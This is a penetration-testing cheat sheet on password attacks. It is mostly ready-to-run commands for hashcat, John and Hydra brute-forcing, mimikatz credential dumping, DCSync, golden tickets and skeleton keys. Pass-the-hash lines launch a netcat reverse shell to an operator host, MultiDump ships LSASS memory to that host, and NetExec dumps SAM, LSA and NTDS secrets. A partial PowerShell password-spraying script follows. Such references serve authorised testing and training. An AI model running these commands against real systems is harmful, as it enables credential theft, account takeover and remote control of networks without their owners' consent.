# Password Attacks

- [Resources](#resources)

## Table of Contents

- [AES](#aes)
- [bkcrack](#bkcrack)
- [DonPAPI](#donpapi)
- [fcrack](#fcrack)
- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
- [Hash-Buster](#hash-buster)
- [hashcat](#hashcat)
- [Hydra](#hydra)
- [John](#john)
- [Kerbrute](#kerbrute)
- [LaZagne](#lazagne)
- [LUKS](#luks)
- [Medusa](#medusa)
- [mimikatz](#mimikatz)
- [MultiDump](#multidump)
- [NetExec](#netexec)
- [Patator](#patator)
- [PDFCrack](#pdfcrack)
- [pypykatz](#pypykatz)
- [RsaCtfTool](#rsactftool)
- [Spray-Passwords](#spray-passwords)
- [SprayingToolkit](#sprayingtoolkit)
- [VNC Password Recovery](#vnc-password-recovery)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BetterSafetyKatz | Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory. | https://github.com/Flangvik/BetterSafetyKatz |
| bkcrack | Crack legacy zip encryption with Biham and Kocher's known plaintext attack. | https://github.com/kimci86/bkcrack |
| CredMaster | Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling | https://github.com/knavesec/CredMaster |
| Default Credentials Cheat Sheet | One place for all the default credentials to assist the pentesters during an engagement, this document has a several products default credentials that are gathered from several sources. | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| DeHashed | Breach Database | https://dehashed.com |
| DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! | https://github.com/dafthack/DomainPasswordSpray |
| Firefox Decrypt | Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles | https://github.com/unode/firefox_decrypt |
| go-mimikatz | A wrapper around a pre-compiled version of the Mimikatz executable for the purpose of anti-virus evasion. | https://github.com/vyrus001/go-mimikatz |
| hashcat | Password Cracking | https://hashcat.net/hashcat |
| Hob0Rules | Password cracking rules for Hashcat based on statistics and industry patterns | https://github.com/praetorian-inc/Hob0Rules |
| Hydra | Password Brute Force | https://github.com/vanhauser-thc/thc-hydra |
| John | Password Cracking | https://github.com/openwall/john |
| keepass-dump-masterkey | Script to retrieve the master password of a keepass database <= 2.53.1 | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | A python tool to automate KeePass discovery and secret extraction. | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. | https://github.com/ropnop/kerbrute |
| LaZagne | The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. | https://github.com/AlessandroZ/LaZagne |
| mimikatz | Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. | https://github.com/gentilkiwi/mimikatz |
| MultiDump | MultiDump is a post-exploitation tool for dumping and extracting LSASS memory discreetly. | https://github.com/Xre0uS/MultiDump |
| NetExec | The Network Execution Tool | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | This website offers a NTLM to plaintext password "cracking" service, using a custom high performance database with billions of precomputed password hashes. | https://ntlm.pw |
| Patator | Password Brute Force | https://github.com/lanjelot/patator |
| pypykatz | Mimikatz implementation in pure Python. | https://github.com/skelsec/pypykatz |
| RsaCtfTool | RSA multi attacks tool : uncipher data from weak public key and try to recover private key Automatic selection of best attack for the given public key. | https://github.com/Ganapati/RsaCtfTool |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| Snusbase | Breach Database | https://www.snusbase.com |
| SprayingToolkit | A set of Python scripts/utilities that tries to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient. | https://github.com/byt3bl33d3r/SprayingToolkit |
| TheSprayer | TheSprayer is a cross-platform tool designed to help penetration testers spray passwords against an Active Directory domain without locking out accounts. | https://github.com/coj337/TheSprayer |
| TREVORspray | TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! | https://github.com/blacklanternsecurity/TREVORspray |

## AES

### Cracking AES Encryption

#### Create AES File

```c
aes-256-ctr
aes-128-ofb
aes-192-ofb
aes-256-ofb
aes-128-ecb
aes-192-ecb
aes-256-ecb
```

#### Create String File

```c
Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJvaP2iYQ==
```

#### For Loop

```c
$ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
```

## bkcrack

### Cracking .zip File

```c
$ ./bkcrack -L <FILE>.zip
```

```c
$ cat plaintext.txt
Secret:HTB{
```

```c
$ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
```

## DonPAPI

> https://github.com/login-securite/DonPAPI

```c
$ DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
$ DonPAPI -local_auth <USERNAME>@<RHOST>
$ DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
$ DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

## fcrack

```c
$ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
```

## Group Policy Preferences (GPP)

### gpp-decrypt

> https://github.com/t0thkr1s/gpp-decrypt

```c
$ python3 gpp-decrypt.py -f Groups.xml
$ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## Hash-Buster

> https://github.com/s0md3v/Hash-Buster

```c
$ buster -s 2b6d315337f18617ba18922c0b9597ff
```

## hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

### Common Commands

```c
$ hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
$ hashcat -a 0 -m 0 <FILE> /PATH/TO/WORDLIST/<WORDLIST> -O --force
$ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

### Hash Example Search

```c
$ hashcat --example-hashes
$ hashcat --help | grep -i "ntlm"
```

### Identify Hashes

```c
$ hashcat --identify --user <FILE>
```

### Hash Rules

```c
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
```

### Custom Rules

> https://hashcat.net/wiki/doku.php?id=rule_based_attack

#### Add a 1 to each Password

```c
$ echo \$1 > <FILE>.rule
```

#### Capitalize first character

```c
$1
c
```

#### Add nothing, a 1 or a ! to an existing Wordlist

```c
:
$1
$!
```

#### Rule for upper case Letter, numerical Value and special Character

- $1 > appends a "1"
- $2 > appends a "2"
- $3 > appends a "3"
- c > Capitalize the first character and lower case the rest

```c
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

#### Rule Preview

```c
$ hashcat -r <FILE>.rule --stdout <FILE>.txt
```

### Mask File Example

> https://hashcat.net/wiki/doku.php?id=mask_attack

#### example.hcmask

```
FOOBAR?d?d?d?d
FOOBAR?d?d?d?u
FOOBAR?d?d?u?u
FOOBAR?d?u?u?u
FOOBAR?u?u?u?u
```

### Cracking ASPREPRoast Password File

```c
$ hashcat -m 18200 -a 0 <FILE> <FILE>
```

### Cracking Kerberoasting Password File

```c
$ hashcat -m 13100 --force <FILE> <FILE>
```

### Bruteforce based on the Pattern

```c
$ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate Password Candidates: Wordlist + Pattern

```c
$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
$ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

### Crack with hashcat

```c
$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
```

### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

#### Cracking with OneRuleToRuleThemAll.rule

```c
$ hashcat -m 3200 hash.txt -r /PATH/TO/FILE/<FILE>.rule
```

## Hydra

> https://github.com/vanhauser-thc/thc-hydra

### Common Commands

```c
$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
$ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
```

### Proxy

```c
$ export HYDRA_PROXY=connect://127.0.0.1:8080
$ unset HYDRA_PROXY
```

### SSH

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
```

### FTP

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
```

### SMB

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
```

### MySQL

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
```

### Postgres

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
```

### Telnet

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
```

### VNC

```c
$ hydra <RHOST> -P passwords.txt vnc -V
```

### Docker Registry

```c
$ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
```

### Webform

```c
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
$ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
$ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

## John

> https://github.com/openwall/john

```c
$ john md5 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5
$ john sha-1 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha1
$ john sha256 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha256
$ john bcrypt --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=bcrypt
$ john md4 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=md4
$ john ntlm --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=nt
$ john sha512 --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
```

### Show cracked Password

```c
$ john --show <FILE>
```

### Using Salt

```c
$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5 --mask='<SALT>?w'
```

### Cracking .zip-Files

```c
$ zip2john <FILE> > <FILE>
```

### Cracking EncFS/6

```c
$ encfs2john <DIRECTORY>/ > encfs6.xml.john
$ john encfs6.xml.john --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
```

### Cracking Kerberoasting Password File

```c
$ john --format=krb5tgs --wordlist=<FILE> <FILE>
```

### Cracking RSA

```c
$ ssh2john id_rsa > <FILE>
$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=ssh
```

### Cracking yescrypt

```c
$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
```

### Extracting Hash from .kdbx File

```c
$ keepass2john <FILE>
```

## Kerbrute

> https://github.com/ropnop/kerbrute

### User Enumeration

```c
$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

### Password Spray

```c
$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

## LaZagne

> https://github.com/AlessandroZ/LaZagne

```c
C:\> laZagne.exe all
```

## LUKS

### Extracting LUKS Header

```c
$ dd if=backup.img of=header.luks bs=512 count=4097
```

## Medusa

```c
$ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
```

## mimikatz

> https://github.com/gentilkiwi/mimikatz

### Common Commands

```c
mimikatz # token::elevate
mimikatz # token::revert
mimikatz # vault::cred
mimikatz # vault::list
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

### Execute mimikatz Inline

This is helpful when executing within a `Evil-WinRM` session.

```c
C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

### Dump Hashes

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
mimikatz # sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### Overpass-the-hash / Pass-the-Key

```c
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

#### RC4

```c
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### AES128

```c
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### AES256

```c
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

### Pass the Ticket

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Forging Golden Ticket

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Skeleton Key

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # misc::skeleton
C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

### Data Protection API (DPAPI) Decryption

> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

#### rpc

```c
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

```c
mimikatz # dpapi::cache
```

```c
mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
```

## MultiDump

> https://github.com/Xre0uS/MultiDump

```c
$ python3 MultiDumpHandler.py -r <LPORT>
```

```c
PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
```

## NetExec

> https://github.com/Pennyw0rth/NetExec

```c
$ sudo apt-get install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Installation via Poetry

```c
$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
$ git clone https://github.com/Pennyw0rth/NetExec
$ cd NetExec
$ poetry install
$ poetry run NetExec
```

### Modules

```c
$ netexec ldap -L
$ netexec mysql -L
$ netexec smb -L
$ netexec ssh -L
$ netexec winrm -L
```

### Common Commands

```c
$ netexec smb <RHOST> -u '' -p '' --shares
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' 
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER"
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
$ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
$ netexec ldap <RHOST> -u '' -p '' --asreproast
$ netexec ldap <RHOST> -u '' -p '' -M -user-desc
$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
$ netexec ldap <RHOST> -u '' -p '' -M veeam
$ netexec ldap <RHOST> -u '' -p '' -M maq
$ netexec ldap <RHOST> -u '' -p '' -M adcs
$ netexec ldap <RHOST> -u '' -p '' -M zerologon
$ netexec ldap <RHOST> -u '' -p '' -M petitpotam
$ netexec ldap <RHOST> -u '' -p '' -M nopac
$ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
$ netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
$ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
```

## Patator

> https://github.com/lanjelot/patator

```c
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:mesg='Authentication failed.'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:fgrep='failed'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:egrep='failed'
```

## PDFCrack

```c
$ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
```

## pypykatz

> https://github.com/skelsec/pypykatz

```c
$ pypykatz lsa minidump lsass.dmp
$ pypykatz registry --sam sam system
```

## RsaCtfTool

> https://github.com/Ganapati/RsaCtfTool

```c
$ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
```

## Spray-Passwords

### Spray-Passwords.ps1

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against 
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.
    
    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.
    
    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
	
  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 
    
    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose 
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param 
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }
    
    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

